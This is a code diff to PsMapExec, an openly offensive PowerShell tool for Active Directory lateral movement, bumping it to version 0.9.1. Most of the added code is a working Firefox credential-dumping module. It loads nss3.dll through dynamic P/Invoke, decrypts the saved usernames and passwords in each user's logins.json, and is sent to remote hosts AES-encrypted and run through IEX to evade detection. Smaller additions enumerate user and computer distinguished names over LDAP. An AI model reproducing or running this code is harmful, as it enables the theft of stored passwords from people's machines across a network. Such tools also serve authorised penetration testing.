@@ -148,7 +148,7 @@ Function PsMapExec {
 
 Github  : https://github.com/The-Viper-One
 Wiki    : https://github.com/The-Viper-One/PsMapExec/wiki
-Version : 0.9.0
+Version : 0.9.1
 
 ")
 
@@ -428,6 +428,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
     $ekeys = Join-Path $PME "eKeys"
     $EventCreds = Join-Path $PME "EventCreds"
     $FileZilla = Join-Path $PME "FileZilla"
+    $Firefox = Join-Path $PME "Firefox"
     $IPMI = Join-Path $PME "IPMI"
     $Kerberoast = Join-Path $PME "Kerberoast"
     $LogonPasswords = Join-Path $PME "LogonPasswords"
@@ -470,6 +471,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
         $ekeys,
         $EventCreds,
         $FileZilla,
+        $Firefox,
         $IPMI,
         $Kerberoast,
         $LogonPasswords,
@@ -681,6 +683,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
             "AdminCount" {}
             "Amnesiac" {}
             "ComputerSIDs" {}
+            "ComputerDNs" {}
             "ConstrainedDelegation" {}
             "ConsoleHistory" {}
             "DomainSID" {}
@@ -690,6 +693,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
             "eKeys" {}
             "FileZilla" {}
             "Files" {}
+            "Firefox" {}
             "GMSA" {}
             "KerbDump" {}
             "Interactive" {}
@@ -728,6 +732,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
             "UserDescriptions" {}
             "UserLogonRestrictions" {}
             "UserSIDs" {}
+            "UserDNs" {}
             "UserPasswords" {}
             default {
 
@@ -776,11 +781,13 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
                     Write-Host
                     Write-Host "    Information Gathering:"
                     Write-Host "       AdminCount                -> Find users with AdminCount=1"
+                    Write-Host "       ComputerDNs               -> Enumerate computer DistinguishedNames"
                     Write-Host "       ComputerSIDs              -> Enumerate computer SIDs"
                     Write-Host "       MAQ                       -> Machine Account Quota"
                     Write-Host "       UserDescriptions          -> Enumerate user descriptions"
                     Write-Host "       UserLogonRestrictions     -> Enumerate logon restrictions"
                     Write-Host "       UserPasswords             -> Enumerate user password values"
+                    Write-Host "       UserDNs                   -> Enumerate user DistinguishedNames"
                     Write-Host "       UserSIDs                  -> Enumerate user SIDs"
                     Write-Host
                     Write-Host "    Privilege Escalation:"
@@ -1076,6 +1083,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
         "AddToGroup",
         "AdminCount",
         "ComputerSIDs"
+        "ComputerDNs"
         "ConstrainedDelegation",
         "Elevate",
         "GMSA",
@@ -1090,6 +1098,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
         "UserLogonRestrictions",
         "UserDescriptions",
         "UserSIDs"
+        "UserDNs"
         "UserPasswords"
         "whoami"
     )
@@ -1679,6 +1688,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
                 "operatingSystem",
                 "samaccountname",
                 "objectGUID",
+                "lastLogonTimestamp",
                 "userAccountControl"
             ))
 
@@ -1844,7 +1854,8 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
             Start-Sleep -seconds 1
 
             foreach ($Entry in $Results) {
-            
+
+       
                 $GUID = [System.Guid]::new($Entry.Properties['objectGUID'][0]).Guid
             
                 if (-not $Global:TargetDatabase.ContainsKey($GUID)) {
@@ -1860,6 +1871,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
                         if ($Entry.Properties['operatingSystem'][0] -notlike "*windows*server*") {
                             $ComputerEntry['Type'] = "Workstation"
                         }
+
                     }
 
                     if ($Entry.Properties['dnshostname'].Count) {
@@ -1883,25 +1895,25 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
                             $ComputerEntry['Type'] = "Domain Controller"
                         }
                     }
-                            
+                           
+                    $IP = $null
+                    if ($Entry.Properties['lastLogonTimestamp'] -ne $null -and $Entry.Properties['OperatingSystem'] -ne $null){
+
                     # First try to get IP from DNS records
                     if ($DnsRecords.ContainsKey($FQDN)) {
                         $IP = $DnsRecords[$FQDN]
-                        Write-Log "[Gather-LDAPComputers][DNS][$FQDN] Found IP $IP from DNS records"
+                        Write-Log "[Gather-LDAPComputers][DNS-Records][$FQDN] Found IP $IP from DNS records"
                     }
                     # Fallback to hostname lookup in DNS records
                     elseif ($DnsRecords.ContainsKey($SamAccountName)) {
                         $IP = $DnsRecords[$SamAccountName]
-                        Write-Log "[Gather-LDAPComputers][DNS][$FQDN] Found IP $IP in DNS records"
+                        Write-Log "[Gather-LDAPComputers][DNS-Records][$FQDN] Found IP $IP in DNS records"
                     }
-                    # Last resort: use the original Resolve-IPv4Address function
+                    # Try live DNS resolution if not in records
                     else {
-                        Write-Log "[Gather-LDAPComputers][DNS][$FQDN] Falling back to DNS"
+                        Write-Log "[Gather-LDAPComputers][DNS-Resolution][$FQDN] Falling back to DNS"
                         $IP = Resolve-IPv4Address -ComputerName $FQDN
 
-                        if ($IP -eq $null) {
-                            Write-Log "[Gather-LDAPComputers][DNS][$FQDN] FQDN resolution failed, trying hostname"
-                            $IP = Resolve-IPv4Address -ComputerName $SamAccountName
                         }
                     }
 
@@ -1911,6 +1923,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
                     $ComputerEntry['Domain']          = $TargetDomain
                     $ComputerEntry['Target']          = 'N'
                     $ComputerEntry['OperatingSystem'] = $Entry.Properties['operatingSystem'][0]
+                    $ComputerEntry['lastLogonTimestamp'] = $Entry.Properties['lastLogonTimestamp'][0]
                     $Global:TargetDatabase[$GUID]     = $ComputerEntry
 
                     # If working from a non-domain joined machine populate the localhosts file to accomodate better name resolution
@@ -1944,6 +1957,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
         Type               = $null
         Target             = $null
         UserAccountControl = $null
+        lastLogonTimestamp = $null
         GUID               = $null
     }
 
@@ -2049,7 +2063,9 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
     
     # Based on the selected targets, set the Target column in $TargetDatabase to "Y" if the target is found
     # Any computers not marked as "Y" are skipped in the current execution cycle for targeting
+    # Any computers that do not have a lastLogonTimestamp and no OperatingSystem attribute are skipped. (Likely not real computers)
     foreach ($entry in $TargetDatabase.Values) {
+       if ($Entry['lastLogonTimestamp'] -eq $null -and ($Entry['OperatingSystem'] -eq $null)) { continue }
         if ($entry["Domain"] -notin $Domain) { continue }
         foreach ($target in $SelectedTargets) {
             switch -Regex ($target) {
@@ -2059,19 +2075,19 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
                     break
                 }
                 # Mark those that are servers
-                '^(servers)$' {
+                '^(server|servers)$' {
                     if ($entry["Type"] -eq "Server") { $entry["Target"] = "Y" }
                     break
                 }
 
                 # Mark all workstations
-                '^(workstations)$' {
+                '^(workstation|workstations)$' {
                     if ($entry["Type"] -eq "Workstation") { $entry["Target"] = "Y" }
                     break
                 }
 
                 # Mark domain controllers
-                '^(dcs|domain controllers)$' {
+                '^(dc|dcs|domain controllers)$' {
                     if ($entry["Type"] -eq "Domain Controller") { $entry["Target"] = "Y" }
                     break
                 }
@@ -2280,7 +2296,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
     if (!$TargetUsers) { $Global:TargetUsers = @{} }
     Gather-LDAPUsers -Domain $Domain -DomainController $DomainController
 
-    ################################################################################################################
+      ################################################################################################################
     ################################################# MISC IPMI ####################################################
     ################################################################################################################
 
@@ -2440,6 +2456,7 @@ PsMapExec VNC -Target "All" -Domain "Security.local"
         "EventCreds"     = "Event Log Credentials output will be written to $EventCreds"
         "FileZilla"      = "FileZilla output will be written to $FileZilla"
         "Files"          = "File output will be written to $UserFiles"
+        "Firefox"        = "Firefox passwords will be written to $Firefox"
         "KerbDump"       = "Tickets will be written to $Tickets"
         "LSA"            = "LSA output will be written to $LSADump"
         "LSA-Trust"      = "LSA-Trust output will be written to $LSATrust"
@@ -2970,6 +2987,18 @@ $rbs ; `$b = (invoke-rtickets send /nowrap) ; (`$b | Select-String -Pattern 'doI
         $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
     }
 
+    # Firefox Dump
+    elseif ($Module -eq "Firefox") {
+        
+        $Key = Generate-RandomString 32
+        $IV = Generate-RandomString 16  
+        
+        $Command = $LocalFirefox
+        $Command = obfuscation-arguments
+        
+        $Data = Invoke-AES -k $Key -iv $IV -t $Command
+        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
+    }
     # Wifi
     elseif ($Module -eq "wifi") {
         
@@ -3407,7 +3436,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$ScriptInstanceID'`" |
                     $Class              = $RunspaceResult[2]
                     $HasDisplayedResult = $false
                 
-                    try { $Result = $Result.Trim() } catch {}
+                    try {$result = $result.Trim()} catch {}
 
                     if ($Result -eq "Unable to connect") {
                         Continue
@@ -3429,6 +3458,25 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$ScriptInstanceID'`" |
                         Write-Host "   " -NoNewline
                         Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                         Write-Host "ACCESS DENIED"
+
+                        Continue
+                    }
+
+                    elseif ($Result -eq "Error Creating Class") {
+                        $Global:AccessDeniedCount++
+                        if ($SuccessOnly) { continue }
+
+                        Write-Host $($Method).ToUpper() -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "   " -NoNewline
+                        Write-Host ("{0,-16}" -f $($Runspace.IP)) -NoNewline
+                        Write-Host ("{0,-$NameLength}" -f $($Runspace.Hostname)) -NoNewline
+                        Write-Host "   " -NoNewline
+                        Write-Host ("{0,-$DomainLength}" -f $($Runspace.Domain)) -NoNewline
+                        Write-Host "   " -NoNewline                        
+                        Write-Host ("{0,-$OSLength}" -f $($Runspace.OS)) -NoNewline
+                        Write-Host "   " -NoNewline
+                        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
+                        Write-Host "ERROR CREATING WMI CLASS"
 
                         Continue
                     }
@@ -3602,6 +3650,7 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$ScriptInstanceID'`" |
                                 "eKeys"             { "$eKeys\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "EventCreds"        { "$EventCreds\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "FileZilla"         { "$FileZilla\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
+                                "Firefox"           { "$Firefox\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "Files"             { "$UserFiles\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "KerbDump"          { "$Tickets\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "LogonPasswords"    { "$LogonPasswords\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
@@ -3635,15 +3684,13 @@ Get-WmiObject -Class $Class -Filter `"InstanceID = '$ScriptInstanceID'`" |
                                 $Result | Out-File -FilePath $FilePath -Encoding "ASCII" -Force
 
                                 if ($ShowOutput) {
-                                    Write-Output $Result
-                                    Write-Output ""
+                                    Write-Output "`n$Result`n"
                                     $HasDisplayedResult = $true
                                 }
                             }
 
                             elseif (-not $Module -and -not $HasDisplayedResult) {
-                                Write-Output $Result
-                                Write-Output ""
+                                Write-Output "`n$Result`n"
                                 $HasDisplayedResult = $true
                             }
                         }
@@ -3954,12 +4001,9 @@ while (`$true) {
                     $Result             = $RunspaceResult[0]
                     $CleanupResult      = $RunspaceResult[1]
                     $ServiceName        = $RunspaceResult[2]
-
                     $hasDisplayedResult = $false
-                    try {
-                        $result = $result.Trim()
-                    }
-                    catch {}
+
+                    try {$result = $result.Trim()} catch {}
 
 
                     if ($result -eq "Unable to connect") {
@@ -4158,6 +4202,7 @@ while (`$true) {
                                 "EventCreds"        { "$EventCreds\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "FileZilla"         { "$FileZilla\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "Files"             { "$UserFiles\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
+                                "Firefox"           { "$Firefox\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "KerbDump"          { "$Tickets\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "LogonPasswords"    { "$LogonPasswords\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "LSA"               { "$LSADump\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
@@ -4190,15 +4235,13 @@ while (`$true) {
                                 $Result | Out-File -FilePath $FilePath -Encoding "ASCII" -Force
 
                                 if ($ShowOutput) {
-                                    Write-Output $Result
-                                    Write-Output ""
+                                    Write-Output "`n$Result`n"
                                     $HasDisplayedResult = $true
                                 }
                             }
 
                             elseif (-not $Module -and -not $HasDisplayedResult) {
-                                Write-Output $Result
-                                Write-Output ""
+                                Write-Output "`n$Result`n"
                                 $HasDisplayedResult = $true
                             }
                         }
@@ -4393,6 +4436,8 @@ while (`$true) {
                     $Result             = $null
                     $Result             = $RunspaceResult
                     $hasDisplayedResult = $false
+
+                   # try {$result = $result.Trim()} catch {}
 
                     if ($result -eq "Unable to connect") {
                         Continue
@@ -4643,6 +4688,7 @@ while (`$true) {
                                 "EventCreds"        { "$EventCreds\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "FileZilla"         { "$FileZilla\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "Files"             { "$UserFiles\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
+                                "Firefox"           { "$Firefox\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "KerbDump"          { "$Tickets\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "LogonPasswords"    { "$LogonPasswords\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                                 "LSA"               { "$LSADump\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
@@ -4676,14 +4722,12 @@ while (`$true) {
 
                                 if ($ShowOutput) {
                                     Write-Output $Result
-                                    Write-Output ""
                                     $HasDisplayedResult = $true
                                 }
                             }
 
                             elseif (-not $Module -and -not $HasDisplayedResult) {
                                 Write-Output $Result
-                                Write-Output ""
                                 $HasDisplayedResult = $true
                             }
                         }
@@ -5827,6 +5871,7 @@ while (`$true) {
                         return $Result
                     }
                 }
+             
 
                 if ($Module -eq "ConstrainedDelegation") {
 
@@ -6268,6 +6313,82 @@ while (`$true) {
                     
                     return $Output
                 }
+
+                if ($Module -eq "UserDNs") {
+                    
+                    $DN = "DC=$($Domain.Replace('.', ',DC='))"
+                    $LDAP = "LDAP://$TargetIP/$DN"
+        
+                    if ($Username -and $Password) {
+                        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP, $Username, $Password)
+                    }
+                    
+                    else {
+                        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+                    }
+                    
+                    $Searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$directoryEntry)
+                    $Searcher.PageSize = 1000
+                    
+                    $Searcher.Filter = "(&(objectCategory=person)(objectClass=user))"
+                    
+                    $Searcher.PropertiesToLoad.Add("sAMAccountName") > $null
+                    $Searcher.PropertiesToLoad.Add("distinguishedName") > $null
+                    $Results = $Searcher.FindAll()
+
+                    $UserData = foreach ($Result in $Results) {
+                        [PSCustomObject]@{
+                            sAMAccountName    = $Result.Properties["samaccountname"][0]
+                            distnguishedName  = $Result.Properties["distinguishedName"][0]
+                        }
+                    }
+
+                    $Output += "`n"
+                    $Output += "[*] User distinguisedNames`n"
+                    $Output += ($UserData | Sort-Object sAMAccountName | Format-Table -AutoSize | Out-String)
+                    
+                    $Searcher.Dispose > $null
+                    
+                    return $Output
+                }
+                
+                if ($Module -eq "ComputerDNs") {
+                    
+                    $DN = "DC=$($Domain.Replace('.', ',DC='))"
+                    $LDAP = "LDAP://$TargetIP/$DN"
+        
+                    if ($Username -and $Password) {
+                        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP, $Username, $Password)
+                    }
+                    
+                    else {
+                        $directoryEntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)
+                    }
+                    
+                    $Searcher = New-Object DirectoryServices.DirectorySearcher([ADSI]$directoryEntry)
+                    $Searcher.PageSize = 1000
+                    
+                    $Searcher.Filter = "(&(objectCategory=computer)(objectClass=computer))"
+                    
+                    $Searcher.PropertiesToLoad.Add("sAMAccountName") > $null
+                    $Searcher.PropertiesToLoad.Add("distinguishedName") > $null
+                    $Results = $Searcher.FindAll()
+
+                    $ComputerData = foreach ($Result in $Results) {
+                        [PSCustomObject]@{
+                            sAMAccountName    = $Result.Properties["samaccountname"][0]
+                            distnguishedName  = $Result.Properties["distinguishedName"][0]
+                        }
+                    }
+
+                    $Output += "`n"
+                    $Output += "[*] Computer distinguisedNames`n"
+                    $Output += ($ComputerData | Sort-Object sAMAccountName | Format-Table -AutoSize | Out-String)
+                    
+                    $Searcher.Dispose > $null
+                    
+                    return $Output
+                }                  
                 
                 
                 if ($Module -eq "AdminCount") {
@@ -8434,7 +8555,9 @@ while (`$true) {
                     $AuthUser               = $RunspaceResult[1] 
                     $SYSADMIN               = $RunspaceResult[2]
                     $ImpersonationStatus    = $RunspaceResult[3]
-                    $hasDisplayedResult     = $false
+                    $hasDisplayedResult = $false
+
+                    try {$result = $result.Trim()} catch {}
         
                     if ($result -eq "Unable to connect") {
                         Continue
@@ -8638,6 +8761,7 @@ while (`$true) {
                             "EventCreds"        { "$EventCreds\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                             "FileZilla"         { "$FileZilla\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                             "Files"             { "$UserFiles\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
+                            "Firefox"           { "$Firefox\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                             "KerbDump"          { "$Tickets\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                             "LogonPasswords"    { "$LogonPasswords\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
                             "LSA"               { "$LSADump\$($Runspace.Domain)\$($Runspace.ComputerName).txt" }
@@ -8670,15 +8794,13 @@ while (`$true) {
                             $Result | Out-File -FilePath $FilePath -Encoding "ASCII" -Force
         
                             if ($ShowOutput) {
-                                Write-Output "`n$Result"
-                                Write-Output ""
+                                Write-Output "`n$Result`n"
                                 $HasDisplayedResult = $true
                             }
                         }
         
                         elseif (-not $Module -and -not $HasDisplayedResult) {
-                            Write-Output "`n$Result"
-                            Write-Output ""
+                            Write-Output "`n$Result`n"
                             $HasDisplayedResult = $true
                         }
                         
@@ -10793,9 +10915,7 @@ while (`$true) {
             Add-Type -AssemblyName "System.IO.Compression.FileSystem"
         }
 
-        catch {
-            Write-Output "`n[*] Unable to load Assembly for System.IO.Compression.FileSystem"
-        }
+        catch {}
 
         Write-Host "`n`nParsing Snips`n" -ForegroundColor "Yellow"
     
@@ -15814,6 +15934,269 @@ $CredentialPairRegexPatterns = @(
 
     if (!$SysmonResults -and (!$SecurityResults)) { return "`nNo Results" }
 
+}
+'@
+
+################################################################################################################
+####################################### Module: Firefox ########################################################
+################################################################################################################
+
+$global:LocalFirefox = @'
+
+Function ConvertFrom-NSS {
+    Param (
+        [Parameter(Position = 0, Mandatory = $true)]
+        [String[]] $Data,
+
+        [Parameter(Position = 1, Mandatory = $true)]
+        [String] $ProfileDir
+    )
+
+    # Search for the nss3.dll file
+    $locations = @(
+        Join-Path $env:ProgramFiles 'Mozilla Firefox'
+        Join-Path ${env:ProgramFiles(x86)} 'Mozilla Firefox'
+        Join-Path $env:ProgramFiles 'Nightly'
+        Join-Path ${env:ProgramFiles(x86)} 'Nightly'
+    )
+
+    [String] $NSSDll = ''
+    foreach ($loc in $locations) {
+        $nssPath = Join-Path $loc 'nss3.dll'
+        if (Test-Path $nssPath) {
+            $NSSDll = $nssPath
+            break
+        }
+    }
+    if ($NSSDll -eq '') {
+        return 'No Results'
+    }
+
+    # Create the ModuleBuilder (dynamic P/Invoke)
+    $DynAssembly = New-Object System.Reflection.AssemblyName('NSSLib')
+    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
+    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('NSSLib', $false)
+
+    # Define a new class and common arrays
+    $TypeBuilder = $ModuleBuilder.DefineType('NSS', 'Public, Class')
+    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
+    $FieldArray = [Reflection.FieldInfo[]] @(
+        [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
+        [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
+    )
+
+    # Define NSS_Init
+    $PInvokeMethodInit = $TypeBuilder.DefineMethod(
+        'NSS_Init',
+        [Reflection.MethodAttributes] 'Public, Static',
+        [Int],
+        [Type[]] @([String])
+    )
+    $FieldValueArrayInit = [Object[]] @(
+        'NSS_Init',
+        $true,
+        $true,
+        [Runtime.InteropServices.CallingConvention]::Winapi,
+        [Runtime.InteropServices.CharSet]::ANSI
+    )
+    $SetLastErrorCustomAttributeInit = New-Object Reflection.Emit.CustomAttributeBuilder(
+        $DllImportConstructor,
+        @($NSSDll),
+        $FieldArray,
+        $FieldValueArrayInit
+    )
+    $PInvokeMethodInit.SetCustomAttribute($SetLastErrorCustomAttributeInit)
+
+    # Define NSS_Shutdown (new)
+    $PInvokeMethodShutdown = $TypeBuilder.DefineMethod(
+        'NSS_Shutdown',
+        [Reflection.MethodAttributes] 'Public, Static',
+        [Int],
+        [Type[]] @()
+    )
+    $FieldValueArrayShutdown = [Object[]] @(
+        'NSS_Shutdown',
+        $true,
+        $true,
+        [Runtime.InteropServices.CallingConvention]::Winapi,
+        [Runtime.InteropServices.CharSet]::Ansi
+    )
+    $SetLastErrorCustomAttributeShutdown = New-Object Reflection.Emit.CustomAttributeBuilder(
+        $DllImportConstructor,
+        @($NSSDll),
+        $FieldArray,
+        $FieldValueArrayShutdown
+    )
+    $PInvokeMethodShutdown.SetCustomAttribute($SetLastErrorCustomAttributeShutdown)
+
+    # Define SecItem Struct
+    $StructAttributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
+    $StructBuilder = $ModuleBuilder.DefineType('SecItem', $StructAttributes, [System.ValueType])
+    $StructBuilder.DefineField('type', [int], 'Public') | Out-Null
+    $StructBuilder.DefineField('data', [IntPtr], 'Public') | Out-Null
+    $StructBuilder.DefineField('len', [int], 'Public') | Out-Null
+    $SecItemType = $StructBuilder.CreateType()
+
+    # Define PK11SDR_Decrypt
+    $PInvokeMethodDecrypt = $TypeBuilder.DefineMethod(
+        'PK11SDR_Decrypt',
+        [Reflection.MethodAttributes] 'Public, Static',
+        [Int],
+        [Type[]] @($SecItemType, $SecItemType.MakeByRefType())
+    )
+    $FieldValueArrayDecrypt = [Object[]] @(
+        'PK11SDR_Decrypt',
+        $true,
+        $true,
+        [Runtime.InteropServices.CallingConvention]::Winapi,
+        [Runtime.InteropServices.CharSet]::Unicode
+    )
+    $SetLastErrorCustomAttributeDecrypt = New-Object Reflection.Emit.CustomAttributeBuilder(
+        $DllImportConstructor,
+        @($NSSDll),
+        $FieldArray,
+        $FieldValueArrayDecrypt
+    )
+    $PInvokeMethodDecrypt.SetCustomAttribute($SetLastErrorCustomAttributeDecrypt)
+
+    $NSS = $TypeBuilder.CreateType()
+
+    # Initialize NSS and ensure we shutdown on exit
+    $initOk = $false
+    try {
+        $ret = $NSS::NSS_Init($ProfileDir)
+        $initOk = ($ret -eq 0)
+    } catch {
+        # If NSS_Init throws, we can't proceed; ensure we attempt shutdown below
+        $initOk = $false
+    }
+
+    $decryptedArray = New-Object System.Collections.ArrayList
+
+    try {
+        if (-not $initOk) {
+            return $null
+        }
+
+        foreach ($dataPart in $Data) {
+            if ([string]::IsNullOrEmpty($dataPart)) { continue }
+
+            # Decode data into bytes and marshal them into a pointer
+            $dataBytes = [System.Convert]::FromBase64String($dataPart)
+            $dataPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($dataBytes.Length)
+            [System.Runtime.InteropServices.Marshal]::Copy($dataBytes, 0, $dataPtr, $dataBytes.Length)
+
+            try {
+                # Set up structures
+                $encrypted = [Activator]::CreateInstance($SecItemType)
+                $encrypted.type = 0
+                $encrypted.data = $dataPtr
+                $encrypted.len = $dataBytes.Length
+
+                $decrypted = [Activator]::CreateInstance($SecItemType)
+                $decrypted.type = 0
+                $decrypted.data = [IntPtr]::Zero
+                $decrypted.len = 0
+
+                # Decrypt the data
+                $NSS::PK11SDR_Decrypt($encrypted, [ref] $decrypted) | Out-Null
+
+                # Safety: only copy if we got data
+                if ($decrypted.len -gt 0 -and $decrypted.data -ne [IntPtr]::Zero) {
+                    $bytePtr = $decrypted.data
+                    $byteData = [byte[]]::new($decrypted.len)
+                    [System.Runtime.InteropServices.Marshal]::Copy($bytePtr, $byteData, 0, $decrypted.len)
+                    $dataStr = [System.Text.Encoding]::UTF8.GetString($byteData)
+                    $decryptedArray.Add($dataStr) | Out-Null
+                } else {
+                    # Add a note of failure for this element
+                    $decryptedArray.Add($null) | Out-Null
+                }
+            }
+            finally {
+                # Deallocate the pointer memory for input
+                if ($dataPtr -ne [IntPtr]::Zero) {
+                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($dataPtr)
+                }
+            }
+        }
+    }
+    finally {
+        # Shutdown NSS for this profile to avoid process-wide state bleed
+        try {
+            $NSS::NSS_Shutdown() | Out-Null
+            # encourage native libs to unload
+            [System.GC]::Collect()
+            [System.GC]::WaitForPendingFinalizers()
+            Start-Sleep -Milliseconds 150
+        } catch {
+            # ignore shutdown errors - nothing sensible to do here
+        }
+    }
+
+    return $decryptedArray.ToArray()
+}
+
+function Get-UserProfilePaths { 
+    Get-ChildItem -Path "$env:SystemDrive\Users" -Directory |
+    Where-Object { 
+        $_.BaseName -ne "Public" -and $_.BaseName -notlike "*defaultuser*" 
+    } |
+    Select-Object -ExpandProperty FullName -ErrorAction "SilentlyContinue"
+}
+
+$FF_Profile_Array = foreach ($UserProfile in (Get-UserProfilePaths)) {
+    $FirefoxProfilesPath = "$UserProfile\AppData\Roaming\Mozilla\Firefox\Profiles"
+    
+    if (Test-Path $FirefoxProfilesPath) {
+        Get-ChildItem -Path $FirefoxProfilesPath -Directory |
+        Select-Object -ExpandProperty FullName
+    }
+}
+
+if ($FF_Profile_Array.Count -lt 1) { return 'No Results' }
+
+# Identify logins.json files in each profile
+$FF_Profile_Logins_Array = foreach ($FF_Profile in $FF_Profile_Array) {
+    Get-ChildItem -Path $FF_Profile -Filter "logins.json" -ErrorAction SilentlyContinue |
+    Select-Object -ExpandProperty FullName
+}
+
+if ($FF_Profile_Logins_Array.Count -lt 1) { return 'No Results' }
+
+$AllResults = foreach ($FF_Profile_Login_File in $FF_Profile_Logins_Array) {
+    $ProfileDir = Split-Path $FF_Profile_Login_File -Parent
+    
+    try {
+        $PasswordData = Get-Content -Path $FF_Profile_Login_File -Raw | ConvertFrom-Json
+        
+        if ($PasswordData.logins) {
+            foreach ($login in $PasswordData.logins) {
+                $decryptedUsername = ConvertFrom-NSS -Data $login.encryptedUsername -ProfileDir $ProfileDir
+                $decryptedPassword = ConvertFrom-NSS -Data $login.encryptedPassword -ProfileDir $ProfileDir
+                
+                $PathUser = (($ProfileDir -split '\\Users\\')[1] -split '\\')[0]
+                
+                [PSCustomObject]@{
+                    User     = $PathUser
+                    URL      = $login.hostname
+                    Username = if ($decryptedUsername) { $decryptedUsername } else { "Decryption Failed" }
+                    Password = if ($decryptedPassword) { $decryptedPassword } else { "Decryption Failed" }
+                }
+            }
+        }
+    }
+    catch {}
+}
+
+if ($AllResults.Count -gt 0) {
+    $AllResults | Sort-Object -Property User, URL, Username, Password -Unique | Format-Table -AutoSize
+}
+else {
+    return 'No Results'
 }
 '@
 
